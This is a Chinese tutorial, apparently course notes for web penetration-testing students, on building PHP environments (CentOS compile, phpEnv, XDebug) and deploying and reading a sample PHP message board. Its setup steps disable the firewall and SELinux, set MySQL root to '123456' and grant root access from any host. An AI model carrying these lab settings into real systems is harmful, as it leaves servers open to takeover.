# PHP项目学习及查找漏洞

## 第一节 PHP简介

### 1.什么是PHP

PHP定义：一种服务器端的HTML脚本（编程语言），是一种简单的、面向对象的、解释型的、健壮的、安全的、性能非常之高的、独立于架构的、可移植的、动态的脚本语言。是一种广泛用于open source（开放源代码）的尤其适合web开发并可以嵌入HTML的多用途脚本语言。它的语法接近C、java和Perl，而且易学习。该语言让web开发人员能够快速的书写动态生成的网页。

PHP前身：Personal HomePage，个人主页，使用Perl语言开发的一种写个人主页的语言。

PHP：PHP Hypertext Preprocessor，PHP超文本预处理器，底层使用C语言。

### 2.PHP发展史

`Rasmus Lerdorf` ：创建者，拉斯姆斯.勒多夫；

- 1994：1.0，个人perl，非常简单（简陋）；
- 1996：2.0，C底层，变的相对比较强大；

- 1998：3.0，zendEngine，联合zend公司共同管理和维护PHP，zendEngine（zend引擎）用户高效的解析php代码；

- 2000：4.0，session+输出缓冲等，session技术（会话技术）；

- 2004：5.0，zend引擎2代，增加新技术（面向对象更新，命名空间，异常）；

- 2015：7.0，新版的ZendEngine引擎，性能提升，新特性（异常）；

平台支持（window，Linux，UNIX）；

数据库支持（Sqlserver，mysql，Oracle，Access）。

## 第二节 安装PHP环境

### 1.Linux下安装PHP运行环境

为什么要在Linux下安装PHP运行环境？因为在日常工作中，公司的业务程序通常在Linux服务器上运行，所以，熟悉Linux的PHP环境搭建是相当重要的工作内容。

下面我们就一起来在Linux系统下搭建PHP运行环境。

#### 1）环境准备

在开始搭建之前，请确保你的Linux系统已经安装并配置好了基本的开发工具和网络环境。

以下是一个通用的Linux发行版环境准备清单：

安装Linux操作系统（如Ubuntu、CentOS等）。

更新系统和软件包列表。

安装必要的开发工具，如gcc、make等。

配置网络连接，确保能够访问互联网。

##### 纯净centos

##### 关闭防火墙

```
systemctl stop firewalld
systemctl disable firewalld
```

##### 关闭SELinux

```
setenforce 0

vim /etc/selinux/config
SELINUX=disabled
```

#### 2）安装Apache

Apache是世界上最流行的Web服务器软件之一，支持PHP的解析和运行。在Linux上，你可以通过包管理器来安装Apache。

CentOS 7上执行命令：

默认会安装Apache 2.4版本

```
yum update -y	
yum install httpd httpd-devel -y
systemctl start httpd
```

> 命令解释：
>
> httpd是Apache的web服务，httpd-devel是Apache连接PHP的依赖包，安装后会生成apxs文件，
>
> PHP编译安装时，通过指定apxs文件路径，促使生成一个php的链接库文件，例如：libphp7.so

检查apxs文件路径

```
[root@localhost ~]# which apxs
/usr/bin/apxs
```

启动完成后，在浏览器访问当前服务器的ip，出现如下页面表示Apache安装并启动成功。

#### 3）安装PHP解释器

在日常工作中，一般需要编译安装PHP，这样可以在一个服务器上编译安装不同的PHP版本，有助于应对不同公司使用不同版本的情况，

本次教学内容中，将编译安装两个PHP版本，分别是PHP7.4和PHP8.2，这两个版本足以应对目前市面上绝大部分的PHP项目。

##### ①PHP 7.4

###### 卸载其他php

```
yum list installed | grep php
sudo yum remove php*
sudo yum remove php* --nodeps
```

###### Ⅰ.下载

下载PHP 7.4源码包：

在根目录创建data目录，用了管理各个PHP版本

```
mkdir /data
cd /data
wget https://www.php.net/distributions/php-7.4.33.tar.gz
```

###### Ⅱ.解决依赖

安装依赖包

```
yum -y install freetype-devel openssl-devel bzip2-devel zlib zlib-devel libpng libpng-devel libzstd-devel sqlite-devel libcurl-devel libjpeg-devel libxslt-devel autoconf
```

安装oniguruma依赖包

```
wget https://github.com/kkos/oniguruma/releases/download/v6.9.9/onig-6.9.9.tar.gz
tar zxf onig-6.9.9.tar.gz
cd onig-6.9.9
./configure --prefix=/usr --libdir=/lib64
make && make install
cd ..
```

安装libzip依赖包

```
yum remove libzip -y
wget https://libzip.org/download/libzip-1.3.2.tar.gz
tar zxf libzip-1.3.2.tar.gz
cd libzip-1.3.2/
./configure
make && make install

vim /etc/profile

export PKG_CONFIG_PATH="/usr/local/lib/pkgconfig/"

source /etc/profile
cd ..
```

配置libzip库，使configure可以找到它

###### Ⅲ.编译和安装

解压源码包

```
tar zxf php-7.4.33.tar.gz
cd php-7.4.33/
```

编译配置

```
./configure \
--prefix=/data/php74 \
--with-apxs2=/usr/bin/apxs \
--with-config-file-path=/data/php74/etc \
--with-libdir=/usr/lib64 \
--with-freetype=/usr/include/freetype2/freetype/ \
--with-jpeg=/usr/lib64 \
--disable-rpath \
--with-curl \
--enable-gd \
--with-gettext \
--with-mysqli \
--with-openssl \
--with-openssl-dir \
--with-iconv \
--with-zip \
--with-pdo-mysql \
--with-pdo-sqlite \
--with-xsl \
--with-zlib \
--with-bz2 \
--with-mhash \
--enable-fpm \
--enable-pdo \
--enable-session \
--enable-simplexml \
--enable-bcmath \
--enable-mbregex \
--enable-mbstring \
--enable-opcache \
--enable-pcntl \
--enable-shmop \
--enable-soap \
--enable-sockets \
--enable-sysvmsg \
--enable-sysvsem \
--enable-sysvshm \
--enable-mysqlnd \
--enable-xml \
--enable-phar
```

configure运行成功后，输出如下图所示：

![image-20240907101826917](https://image.201068.xyz/assets/31.PHP/image-20240907101826917.png)

编译安装

```
make && make install
```

编译安装成功后，输出如下图所示：

![image-20240907102026993](https://image.201068.xyz/assets/31.PHP/image-20240907102026993.png)

###### Ⅳ.配置

配置PHP	

```
cd /data/php-7.4.33
cp php.ini-production /data/php74/etc/php.ini
cp /data/php74/etc/php-fpm.conf.default /data/php74/etc/php-fpm.conf
cp /data/php74/etc/php-fpm.d/www.conf.default /data/php74/etc/php-fpm.d/www.conf
cp sapi/fpm/init.d.php-fpm /etc/init.d/php74-fpm
chmod +x /etc/init.d/php74-fpm
```

配置php.ini

一般默认配置即可运行PHP的项目，例如，有些项目要求限制上传文件大小，则可以修改：

```
vim /data/php74/etc/php.ini

file_uploads = On
upload_max_filesize = 2M
```

![image-20240907112849402](https://image.201068.xyz/assets/31.PHP/image-20240907112849402.png)

配置环境变量

在`/etc/profile`文件末尾添加php环境变量

```
vim /etc/profile

export PHP_HOME=/data/php74
export PATH=$PATH:$PHP_HOME/bin:$PHP_HOME/sbin
```

保存后刷新环境变量

```
source /etc/profile
```

查看php版本

```
php -v
```

启动、停止和重启php-fpm

php74-fpm取决于你复制到`/etc/init.d/`目录下的文件名

```
#启动
service php74-fpm start
#停止
service php74-fpm stop
#重启
service php74-fpm restart
```

以上工作完成之后，会在httpd的模块目录下生成一个`libphp7.so`的连接库文件：

```
ll /etc/httpd/modules/libphp7.so

-rwxr-xr-x 1 root root 40870448 9月 1 21:04 libphp7.so
```

当然也会在系统链接库中生成对应的httpd与PHP的链接库：

```
ll /usr/lib64/httpd/modules/libphp7.so

-rwxr-xr-x 1 root root 40870448 9月 1 21:04 /usr/lib64/httpd/modules/libphp7.so
```

##### ②PHP 8.2

###### Ⅰ.下载

下载PHP 8.2源码包

```
cd /data
wget https://www.php.net/distributions/php-8.2.5.tar.gz
tar zxf php-8.2.5.tar.gz
cd php-8.2.5
```

###### Ⅱ.解决依赖

安装依赖包

```
yum install -y gcGc gcc-c++ make cmake automake autoconf gd file bison patch mlocate flex diffutils zlib zlib-devel pcre pcre-devel libjpeg libjpeg-devel libpng libpng-devel freetype freetype-devel libxml2 libxml2-devel glibc glibc devel glib2 glib2-devel bzip2 bzip2-devel ncurses ncurses-devel curl curl-devel libcurl libcurl-devel e2fsprogs e2fsprogs-devel krb5 krb5-devel kernel-devel libtool-libs readline-devel gettext-devel libcap-devel php-mcrypt libmcrypt libmcrypt-devel recode-devel sqlite-devel oniguruma oniguruma-devel openssl-devel sqlite-devel
```

与PHP 7.4同样，oniguruma和libzip的依赖库也需要安装，因为我们在同一台服务器上安装，这两个依赖库已经被安装，所以这里就跳过了，如果在实际工作环境中单独安装PHP版本，要记得安装这两个库。

###### Ⅲ.编译和安装

编译配置

```
./configure \
--prefix=/data/php82 \
--with-apxs2=/usr/bin/apxs \
--with-config-file-path=/data/php82/etc \
--with-libdir=/usr/lib64 \
--with-freetype=/usr/include/freetype2/freetype/ \
--with-jpeg=/usr/lib64 \
--with-mysqli \
--with-pdo-mysql \
--enable-opcache \
--enable-gd \
--with-iconv \
--with-zip \
--disable-debug \
--disable-rpath \
--enable-shared \
--enable-xml \
--enable-bcmath \
--enable-shmop \
--enable-sysvsem \
--enable-mbregex \
--enable-mbstring \
--enable-ftp \
--enable-pcntl \
--enable-sockets \
--enable-soap \
--without-pear \
--with-gettext \
--enable-session \
--with-curl \
--enable-fpm \
--without-gdbm \
--enable-fast-install \
--with-openssl \
--with-openssl-dir
```

编译安装

```bash
make && make install
```

###### Ⅳ.配置

配置PHP

```bash
cd /data/php-8.2.5
cp php.ini-production /data/php82/etc/php.ini
cp /data/php82/etc/php-fpm.conf.default /data/php82/etc/php-fpm.conf
cp /data/php82/etc/php-fpm.d/www.conf.default /data/php82/etc/php-fpm.d/www.conf
cp sapi/fpm/init.d.php-fpm /etc/init.d/php82-fpm
chmod +x /etc/init.d/php82-fpm
cd /data/php82/etc
```

配置php.ini

一般默认配置即可运行PHP的项目，例如，有些项目要求限制上传文件大小，则可以修改：

```bash
vi php.ini

file_uploads = On
upload_max_filesize = 2M
```

配置环境变量

在/etc/profile文件末尾添加php环境变量

```bash
vim /etc/profile

#export PHP_HOME=/data/php74
export PHP_HOME=/data/php82
export PATH=$PATH:$PHP_HOME/bin:$PHP_HOME/sbin
```

保存后刷新环境变量

```bash
source /etc/profile
```

**注销一次登录**

查看php版本

```bash
php -v
```

> 注意：
>
> 多个PHP版本共存一台服务器，切换环境变量后，最好注销一次登录，才能让环境变量完全切换过来



启动、停止和重启php-fpm

php82-fpm取决于你复制到`/etc/init.d/`目录下的文件名

```bash
#启动
service php82-fpm start
#停止
service php82-fpm stop
#重启
service php82-fpm restart
```

以上工作完成之后，会在httpd的模块目录下生成一个libphp.so的连接库文件：

```bash
ll /etc/httpd/modules/libphp.so

-rwxr-xr-x 1 root root 49797856 9月 2 09:46 libphp.so
```

当然也会在系统链接库中生成对应的httpd与PHP的链接库：

```bash
ll /usr/lib64/httpd/modules/libphp.so

-rwxr-xr-x 1 root root 49797856 9月 2 09:46 /usr/lib64/httpd/modules/libphp.so
```

#### 4）配置Apache以支持PHP

以上命令步骤都正确执行完毕之后，会**自动**修改`/etc/httpd/conf/httpd.conf`文件，在55行附近添加下面一行内容：

```bash
vim /etc/httpd/conf/httpd.conf

LoadModule php7_module /usr/lib64/httpd/modules/libphp7.so
```

如果httpd.conf配置文件没有自动被修改，那么编辑Apache的配置文件/etc/httpd/conf/httpd.conf，在文件最后加入以下内容：

```bash
LoadModule php7_module /usr/lib64/httpd/modules/libphp7.so
```

修改httpd.conf其他配置，让Apache支持PHP：

```bash
vim /etc/httpd/conf/httpd.conf

ServerName localhost:80

AddType application/x-httpd-php .php
AddType application/x-httpd-php-source .phps

<IfModule dir_module>
	DirectoryIndex index.php index.html
</IfModule>
```

![image-20240907114051562](https://image.201068.xyz/assets/31.PHP/image-20240907114051562.png)

![image-20240907114144231](https://image.201068.xyz/assets/31.PHP/image-20240907114144231.png)

在`/var/www/html/`目录下，新增一个`index.php`文件，添加如下内容：

```bash
echo '<?php phpinfo();?>' > /var/www/html/index.php
```

重启httpd服务

```bash
systemctl restart httpd
```

在浏览器访问httpd服务下的index.php，如果显示如下内容，表示Apache和PHP配置成功；

#### 5）切换PHP版本

首先，要停止php-fpm程序；

```
service php74-fpm stop
```

然后，在`/etc/profile`配置文件末尾切换系统环境变量，将启用版本的环境变量前面的`#`删除，将不启用版本的环境变量前面加上#注释，然后保存退出；

```bash
vim /etc/profile

#export PHP_HOME=/data/php74
export PHP_HOME=/data/php82
```

使环境变量生效：

```bash
source /etc/profile
```

启动php82-fpm服务：

```bash
service php82-fpm start
```

检查php-fpm进程：

```bash
ps -ef|grep php

root 25090 1 0 11:39 ? 00:00:00 php-fpm: master process (/data/php82/etc/php-fpm.conf)
nobody 25091 25090 0 11:39 ? 00:00:00 php-fpm: pool www
nobody 25092 25090 0 11:39 ? 00:00:00 php-fpm: pool www
```

在Apache的配置文件httpd.conf中切换php模块版本：

```bash
vim /etc/httpd/conf/httpd.conf

#LoadModule php7_module /usr/lib64/httpd/modules/libphp7.so
LoadModule php_module /usr/lib64/httpd/modules/libphp.so
```

重启Apache服务：

```bash
systemctl restart httpd
```

访问`index.php`，查看PHP版本是否切换成功

> 总结：
>
> 1. 1.在实际工作中，运维人员在服务器安装PHP的时候，开发人员会告诉需要安装什么版本的PHP，以及需要指定PHP的编译模块；
> 2. 2.本次教学内容中不同版本指定的编译模块大同小异，基本涵盖了工作中绝大部分需要的模块，实际工作中按需编译安装；
> 3. 3.php-fpm是PHP程序的线程池管理工具，它能有效地给PHP进程分配系统资源，从而高效地运行PHP程序；
> 4. 4.切换不同版本的PHP时候，一定要先停止php-fpm的运行，否则进程池可能有未处理完的业务，切换版本导致处理错误；

#### 6）安装MySQL数据库

在实际工作中，绝大部分公司数据库是与业务程序分离部署的，就是常说的**站库分离**模式，这种部署方式有两个优点：**数据安全**和**系统扩展性更高**。

本节课内容我们使用之前MySQL课程的数据库，模拟站库分离场景，使用**内网地址连接数据库**。

```bash
cd ~
mkdir mysql/
cd mysql
wget https://downloads.mysql.com/archives/get/p/23/file/mysql-5.7.30-1.el7.x86_64.rpm-bundle.tar
tar xf mysql-5.7.30-1.el7.x86_64.rpm-bundle.tar

rpm -ivh mysql-community-common-5.7.30-1.el7.x86_64.rpm 
rpm -ivh mysql-community-libs-5.7.30-1.el7.x86_64.rpm 
rpm -ivh mysql-community-client-5.7.30-1.el7.x86_64.rpm 
rpm -ivh mysql-community-server-5.7.30-1.el7.x86_64.rpm 

mysqld --initialize --user=mysql
grep password /var/log/mysqld.log

systemctl start mysqld
systemctl enable mysqld 
systemctl status mysqld

mysql -u root -p
G_sq<MaVz3Gg

alter user root@localhost identified by '123456';
grant all on *.* to root@'%' identified by '123456' with grant option;
flush privileges;
\q
systemctl restart mysqld
```



### 2.Windows下安装PHP运行环境

为什么要在Windows下安装PHP运行环境？Linux下的PHP运行环境是实际业务运行的基本环境，而我们在Windows下开发和调试PHP程序时也需要PHP的运行环境，在个人电脑上安装PHP就没必要编译安装了，使用集成的PHP环境可以更高效地开展工作。本节教学内容我们使用phpEnv工具来管理Apache和PHP的运行环境，下面我们一起配置phpEnv。

#### 1）下载phpEnv

> 为什么使用phpEnv？
>
> phpEnv集成了多个web服务器（`nginx + apache`），多个PHP版本（5.1~8.0），对于后面学习渗透测试相关的漏洞很有帮助，因为不同的版本对应有不同的漏洞，这样不同版本切换使用是非常方便的。
>
> 安装过程要注意：
>
> 1. 安装路径不能包含“中文”或者“空格”，否则会报错（例如错误提示：Can't change dir to 'G:\x65b0\x5efa\x6587\）；
>
> 2. 保证安装路径是纯净的，安装路径下不能有已安装的phpEnv版本，因为有环境变量冲突，若重新安装，请选择其它路径；

下载地址：https://www.phpenv.cn/

在PHP配套教学工具中，给同学们提供了完整的安装版，与本次教学内容使用的版本相同。



#### 2）安装phpEnv

配套教学工具中的版本是免安装版，解压工具包后，只需运行bin目录里的phpEnv.exe就可以打开程序。

#### 3）简单配置

- 安装 `PHP7.4` 和 MySQL8.0 ，web服务器选择 `Apache` ；
- 然后点击启动服务 ，允许各种允许访问即可；配置路径报错，点击初始化。
- 在浏览器输入：`localhost`，即可访问PHP探针。

#### 4）创建站点

点击 主页图标 下 网站 按钮，添加一个虚拟网站，域名设置为 `www.wasjpentest008.com` ；

可以选择自定义的目录，但是为了教学方便，默认就可以。这个目录默认在phpEnv安装目录下的www目录下；

添加后，phpEnv会自动写入本机hosts，这样我们在浏览器输入 `www.wasjpentest008.com` 域名后就可以访问默认页面；

默认会生成一个index.php，显示结果为：`php7.4 info`；

在phpEnv主页点击启动服务，在浏览器访问`www.wasjpentest008.com`，即可访问phpinfo内容；

### 3.安装PhpStorm

PhpStorm是一款由JetBrains公司开发的PHP集成开发环境（IDE），它提供了强大的代码编辑、智能提示和高度可配置的环境，极大地提升了PHP开发的效率和体验。

以下是关于PhpStorm环境配置与应用的详细步骤：

#### 1）下载

访问www.jetbrains.com官网，点击开发者工具，找到PhpStorm标签；

进入到PhpStorm页面后，选择适合你操作系统的版本进行下载；

#### 2）安装

下载完成后，双击运行安装程序；

默认点击下一步。在安装过程中，可以自定义选择安装路径。

安装完成后，点击“OK”完成安装。

#### 3）配置

##### 修改界面语言

点击左侧**插件**标签

在搜索栏输入“Chinese”，找到中文语言包，点击install，安装完毕需要重启IDE。

##### 配置PHP解释器

在PhpStorm欢迎界面，选择打开图标；

选择我们刚才配置的PHP网站路径`www.wasjpentest008.com`，点击确定；选择菜单列表的文件，点击设置；

打开的设置界面，选择菜单列表的PHP标签，在右侧的PHP语言级别选择`7.4`，CLI解释器就是PHP解释器，点击后面的三个点；

在打开的CLI解释器配置界面中，修改PHP可执行文件的路径，实际上就是phpEnv当前运行的php版本；

在CLI解释器配置界面中，修改配置文件路径，要跟PHP版本想对应；

这些配置完成后，点击应用和确定，phpstorm基础设置就完成了。

### 4.安装XDebug

#### 1）XDebug原理

了解PHP XDebug的工作原理，可以在使用XDebug时会更得心应手，遇到问题之道从哪里着手解决，少走弯路。

##### XDebug调试流程图：

![image-20240907112034683](https://image.201068.xyz/assets/31.PHP/image-20240907112034683.png)

上面这个图表示了`PHP` `XDebug`调试功能的大概流程：

- 没有开启XDebug的情况下，当发起一个请求或者CLI执行程序时，请求转发给PHP，由PHP解释器执行，处理完成后把结果再返回给客户端。
- 在转发给PHP执行的时候，如果请求参数信息表示需要XDebug，如下：
- 那么PHP会告诉XDebug："准备好了吗，有客户端请求来了，接待一下！"。XDebug收到通知之后，检查客户端的IP和端口（php.ini配置文件中的remote_host、remote_url），然后跟来源客户端（就是我们的PhpStorm）发起通信，IDE收到XDebug的连接信息后，就开始建立连接了。
- 保持通信后，PHP程序执行的每一步产生的信息数据，都经过XDebug的过滤处理，XDebug接着发送调试信息给IDE的开发者看，反之，IDE的操作也会发送给PHP，再经XDebug处理，再返回调试信息。

#### 2）C/S架构

上图描述了大概流程，接下来再掌握几个概念。

- Xdebug是一个`PHP`扩展，它采用DBGp协议，提供了对PHP进行Debugging和Profiling的能力。

- XDebug调试是一种`C/S`结构，Client是IDE，Server是PHP-Xdebug，中间通过DBGp协议通信。


#### 3）配置实操

首先需要PHP支持XDebug，开启服务端监听，在实际工作中Linux服务器是我们的正式生产环境，不需要调试程序代码，保留好运行日志就可以。我们只需要在Windows下配置PHP-XDebug调试环境即可。

##### Ⅰ.下载安装扩展

###### 选择跟PHP版本对应的版本

```bash
https://xdebug.org/files/php_xdebug-3.1.6-7.4-vc15-nts-x86_64.dll
```

![image-20240907112330884](https://image.201068.xyz/assets/31.PHP/image-20240907112330884.png)

本次教学系统是`Windows 11 64bit`，`PHP 7.4`，所以下载 `PHP 7.4 VC15（64 bit）` 这个链接，根据自己环境配置下载对应版本。

###### 放入 `php`的目录

将下载好的扩展 `php_xdebug-3.1.6-7.4-vc15-nts-x86_64.dll` 放入 `phpEnv\php\php-7.4\ext\` 目录下。

![image-20240909110932973](https://image.201068.xyz/assets/31.PHP/image-20240909110932973.png)

##### Ⅱ.修改php.ini

在phpEnv中打开PHP 7.4的配置文件`php.ini`

将下面内容放在php.ini文件最后，保存并重启服务。

```bash
[Xdebug]
zend_extension=E:/tools/phpEnv/php/php-7.4/ext/php_xdebug-3.1.6-7.4-vc15-nts-x86_64.dll
xdebug.collect_params=1
xdebug.collect_return=1
;IDE所在主机的IP
xdebug.client_host=localhost
;IDE基于什么端口监听
xdebug.client_port=9103
xdebug.client_handler=dbgp
xdebug.mode=debug
xdebug.start_with_request=yes
xdebug.discover_client_host=true
```

![image-20240909110732481](https://image.201068.xyz/assets/31.PHP/image-20240909110732481.png)

当前配置的意思是，XDebug要启用一个监听，监听的地址是`localhost`，监听的端口是`9103`。如果有客户端（`IDE`）向这个地址端口发送通知，XDebug就可以收到。

##### Ⅲ.IDE配置

配置PhpStorm的debug端口，跟php.ini中一致才能通信。

`9103`

![image-20240909111343042](https://image.201068.xyz/assets/31.PHP/image-20240909111343042.png)

![image-20240909111449718](https://image.201068.xyz/assets/31.PHP/image-20240909111449718.png)

![image-20240909112010938](https://image.201068.xyz/assets/31.PHP/image-20240909112010938.png)

![image-20240909193147880](https://image.201068.xyz/assets/31.PHP/image-20240909193147880.png)

#### 4）开始调试

##### 调试方式有两种：

- 基于命令行CLI调试
- 网页HTTP请求调试

##### Ⅰ.基于命令行CLI调试

首先要指定PHP解释器：直接执行PHP脚本，其实就是对应的PHP版本的可执行文件。

然后，点击运行旁边的小绿色虫子，进入CLI调试模式。

![image-20240909193330017](https://image.201068.xyz/assets/31.PHP/image-20240909193330017.png)

![image-20240909192851234](https://image.201068.xyz/assets/31.PHP/image-20240909192851234.png)

![image-20240909193245643](https://image.201068.xyz/assets/31.PHP/image-20240909193245643.png)

##### Ⅱ.网页HTTP请求调试

通过网页HTTP请求的方式，用`postman`也可以。

新增调试配置之后，要验证是否可以正常的调试。

在预配置下点击验证，用来测试刚刚配置好的调试器配置。如果输出都是正确的，那么刚刚添加的XDebug调试器配置就是正确的。

点击编辑配置，开始配置运行/调试模式。

添加一个PHP网页（PHP Web Page）的配置，相关配置信息按下图填写。以上配置完成后，就可以对项目使用debug模式了。我们在后面分析代码的时候，会用到debug模式。

## 第三节 运行PHP项目

在实际工作中，当开发人员交给你一套PHP程序源码，让你在服务器上运行起来，首先你需要掌握以下的信息，才可以正确的去部署程序：

### 部署程序

- 程序依赖的PHP解释器版本；
- 程序依赖的库；
- 程序依赖的MySQL版本，以及其他中间件的版本信息；
- 程序的配置文件位置，用于修改数据库和其他中间件的连接配置信息；
- 程序所需要的**日志级别**，用于存储程序运行过程中，开发人员写入的日志内容；

通过本节课内容，将带领大家学习一套PHP项目如何在生产环境中运行起来。

本节课使用phpMessage这个项目源码，在给同学们提供的《PHP教学配套资料》中可以找到。

phpMessage是一个用PHP编写的消息板项目，只是提供一个简单易用的平台，用于发布和管理用户消息。

该项目支持用户注册、登录、发布消息和查看消息。

### `phpMessage`项目结构

- `index.php` ：主页，显示所有消息。
- `login.php` ：用户登录页面。
- `register.php` ：用户注册页面。
- `user_messages.php` ：用户发布和查看自己的消息。
- `admin_messages.php` ：管理员审核和管理消息的页面。
- `review_messages.php` ：查看和审核用户消息。
- `db.php` ：数据库连接文件。

### 1.本地运行

#### 1）移动文件

将`phpMessage`文件夹中所有文件复制一份，粘贴到`www.wasjpentest008.com`目录下：

#### 2）PhpStorm打开

使用PhpStorm以项目形式打开`www.wasjpentest008.com`这个目录

#### 3）修改数据库连接配置

在db.php文件中，修改数据库的连接信息

```php
// 数据库连接配置
$servername = "localhost";
$username = "root";
$password = "root";
$dbname = "DynamicSite";
```

在MySQL中创建对应的数据库

```mysql
create database DynamicSite default character set 'utf8';
```

导入项目的数据库备份数据

```bash
mysql -uroot -p DynamicSite <console.sql
```



#### 4）浏览器访问

浏览器访问`www.wasjpentest008.com`会自动跳转到登录页面login.php，我们在后面详细分析是程序是如何跳转，先让它正确运行起来。

本地运行成功后，我们需要将代码部署到生产环境中，就是我们之前在Linux配置好的PHP运行环境，我们将这套代码部署上去。

### 2.服务器运行

#### 1）上传项目

将项目代码打包成一个压缩包，并上传到服务器

```bash
scp PhpMessage.zip root@192.168.70.15:/var/www/html/
```

![image-20240909191523726](https://image.201068.xyz/assets/31.PHP/image-20240909191523726.png)

#### 2）解压源码包

并将所有文件移动到/var/www/html/目录下面

```bash
cd /var/www/html/
unzip PhpMessage.zip
cd PhpMessage
mv * ../ -f
cd ..;rm PhpMessage -rf
```

#### 3）修改中间件配置信息

当前项目只连接了一个数据库，所以在`db.php`文件中，只需修改数据库的连接信息

```bash
vim /var/www/html/db.php

// 数据库连接配置
$servername = "192.168.70.14";
$username = "root";
$password = "123456";
$dbname = "DynamicSite";
```

在MySQL中创建对应的数据库

```bash
mysql -u root -p123456 -h 192.168.70.14
create database DynamicSite default character set 'utf8';
\q
```

导入项目的数据库备份数据

```
mysql -uroot -p -h 192.168.70.14 DynamicSite <console.sql
```

#### 4）浏览器访问

浏览器访问服务器所在的ip地址

http://192.168.70.15

#### 总结

```bash
scp PhpMessage.zip root@192.168.70.15:/var/www/html/
cd /var/www/html/
unzip PhpMessage.zip
vim /etc/httpd/conf/httpd.conf

DocumentRoot "/var/www/html/PhpMessage"
<Directory "/var/www/html/phpMessage">


vim /var/www/html/PhpMessage/db.php

$servername = "192.168.70.14";
$username = "root";
$password = "123456";
$dbname = "DynamicSite";


mysql -u root -p123456 -h 192.168.70.14
create database DynamicSite default character set 'utf8';
grant all on *.* to root@'%' identified by '123456' with grant option;
flush privileges;
\q

cd /var/www/html/PhpMessage
mysql -uroot -p -h 192.168.70.14 DynamicSite <console.sql
```

http://192.168.70.15

## 第四节 分析代码

刚才我们已经在本地和服务端都正确的运行了PHP项目，那么，接下来我们将通过对代码的分析，来学习PHP的语法。通过本节内容，我们需要掌握如下知识：

- PHP基础语法
- MVC结构逻辑
- 调用MySQL保存数据

### 1.首页文件index.php

```php
<?php
session_start();

if (!isset($_SESSION['email'])) {
	header("Location: login.php");
	exit;
}

$user_type = $_SESSION['user_type'];
?>
```

#### 1）PHP代码标记

在PH中，使用 `<?php php代码 ?>` 来标记PHP脚本，示例代码：

```php
<?php
    echo "hello world"
?>
```

#### 2）PHP语句分隔符

在PHP中，代码是以行为单位，系统需要通过判断行的结束，该结束符通常是一个分号“`;`”（英文状态下的分号），如果没有结束符，则会报语法错误。

```php
<?php
    $a = 5;
    echo 'hello world';
?>
```



#### 3）变量的定义

PHP中的所有**变量**都必须使用“`$`”符号；

定义：在系统中增加对应的变量名字（内存）；

赋值：可以将数据赋值给变量名（可以在定义的同时完成）；

在index.php中，定义了`$user_type`变量，用来保存`$_SESSION['user_type']`的值；

我们可以修改项目源码，将`$user_type`变量存储的值打印出来，增加一行代码：

```html
<h1 class="mt-5">user_type, <?php echo $user_type ?></h1>
```

![image-20240909160412755](https://image.201068.xyz/assets/31.PHP/image-20240909160412755.png)

浏览器访问index.php，查看输出结果：

![image-20240909160501151](https://image.201068.xyz/assets/31.PHP/image-20240909160501151.png)

可以看到，`$user_type`变量保存的值是admin。

#### 4）变量的命名规则

- 在PHP中**变量名字**必须以“`$`”符号开始；
- 名字由**字母**、**数字**和**下划线**“`_`”构成，但是**不能以数字开头**；

#### 5）预定义变量

在PHP中，提前定义的变量，系统定义的变量都成为预定义变量，预定义变量都是**数组**。

在index.php文件中，`$_SESSION`就是一个**预定义变量**，**保存着许多需要用到的数据**。

当执行了session_start()函数之后，默认会生成一个`key`为name，`value`为一串字符的值，称为唯一的`session id`，并通过HTTP响应头将这个ID保存到客户端的cookie中。

```php
var_dump($_SESSION);
```

![image-20240909163244999](https://image.201068.xyz/assets/31.PHP/image-20240909163244999.png)

#### 6）if语句

判断条件是否成立。给定一个条件，同时为该条件设置多种情况，然后通过条件判断来实现具体的执行代码段。

最简if，只有一段代码，但是可以选择是否执行：

```
if(条件表达式){
	// 满足条件所要执行的内容;
}
```

示例，如果是星期天就出去玩：

```php
<?php
$day = "weekendy";
// 如果是星期天就出去玩
if ($day == "sunday") {
	echo 'go to play';
}
?>
```

**基础if**，有两面性，满足条件或者不满足条件都有对应的执行代码：

```
if(条件表达式){
	//满足条件后执行的代码段;
}else{
	//不满足条件执行的代码段;
}
```

**复杂if结构**，在判断条件之后，通常就有两种结果：满足或者不满足，在不满足之后还可以再次进行条件判断：

```
if(条件表达式1){
	//满足条件表达式1的代码段;
}elseif(条件表达式2){
	//不满足表达式1条件， 但是满足表达式2的代码;
}… //可以使用多个elseif来进行再次条件筛选
else{
	//全部不满足要执行的代码;
}
```

在当前的index.php中，if语句的条件是 `!isset($_SESSION['email'])` ，条件通过后，代码执行体是

```bash
header("Location: login.php") ：
```

- `!` 表示取反；
- `isset()` 函数的返回值是布尔类型，只有true和false，它的功能是判断传入的参数是否定义了值；
- `$_SESSION['email'] `：`$_SESSION`之前讲过，是预定义变量，是一个数组，email是它的索引，`$_SESSION['email']`的意思是获取索引为email的值；
- `header()` 函数是修改返回响应头的函数，通过修改响应头Location参数，让客户端浏览器跳转到login.php页面。

这段代码的意思是：如果session中不存在email这个key，那么，index.php就会跳转到login.php页面。

### 2.登录文件login.php

```php
<?php

include 'db.php';

session_start();

$error_message = '';

if ($_SERVER["REQUEST_METHOD"] == "POST") {

    if (empty($_POST['email']) || empty($_POST['password'])) {

        $error_message = "请填写所有字段。";

    } else {

        $email = $_POST['email'];

        $password = $_POST['password'];

        $stmt = $conn->prepare("SELECT id, username, password, email, user_type

FROM users WHERE email = :email");

        $stmt->bindParam(':email', $email);

        $stmt->execute();

        $user = $stmt->fetch(PDO::FETCH_ASSOC);

        if ($user && password_verify($password, $user['password'])) {

            $_SESSION['user_id'] = $user['id'];

            $_SESSION['username'] = $user['username'];

            $_SESSION['email'] = $user['email'];

            $_SESSION['user_type'] = $user['user_type'];

            header("Location: index.php");

            exit;

        } else {

            $error_message = "邮箱或密码错误。";

        }

    }

}

?>
```

#### 1）include关键字

`include`表达式**包含并运行指定文件**。

当一个文件被包含时，其中所包含的代码继承了include所在行的变量范围。从该处开始，调用文件在该行处可用的任何变量在被调用的文件中也都可用。

在当前文件中包含了`db.php`，表示在执行login.php之前，先执行db.php，然后将db.php文件中的`$conn` 变量引入到login.php文件中。

#### 2）$_SERVER

获取服务器和执行环境的信息。包含了诸如**头信息**（header）、**路径**（path）、**请求方式**（method）等信息，这个数组中的条目由web服务器创建，所以不能保证每个web服务器都提供全部条目。

在当前文件中， `$_SERVER["REQUEST_METHOD"]` 是获取客户端访问页面使用的请求方法；例如`GET、HEAD、POST、PUT`等。

![image-20240909170534069](https://image.201068.xyz/assets/31.PHP/image-20240909170534069.png)

